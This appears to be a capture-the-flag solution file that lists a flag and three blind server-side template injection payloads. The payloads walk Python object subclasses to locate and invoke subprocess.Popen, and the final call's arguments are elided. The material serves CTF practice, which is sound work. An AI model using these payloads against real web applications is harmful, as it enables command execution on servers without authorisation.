# Flags

CodeReview part 1 flag: IRS{bl1nd_ssti_1s_p41nful_r1gh7}

# Solution

step 1: {{ "<class 'subprocess.Popen'>" in "".__class__.mro()[1].__subclasses__().__str__().split(", ") }}
(good code = true, bad code = false)

step 2: {{ "".__class__.mro()[1].__subclasses__().__str__().split(", ").index("<class 'subprocess.Popen'>") }}
(you can't view this value, so have to search for it)

step 3: {{ "".__class__.mro()[1].__subclasses__()[546](...) }}
(you have won)